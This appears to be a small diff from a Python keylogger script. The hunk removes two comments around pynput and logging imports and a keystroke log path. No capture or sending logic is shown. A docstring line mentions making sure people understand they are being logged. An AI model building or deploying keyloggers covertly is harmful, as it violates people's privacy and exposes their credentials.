@@ -10,11 +10,8 @@ make sure they understand you are doing so.
 '''
 
 from pynput.keyboard import Key, Listener
-
-# The logging library
 import logging
 
-# File path to save keystroke log
 log_dir = ""
 
 # Set logging configurations
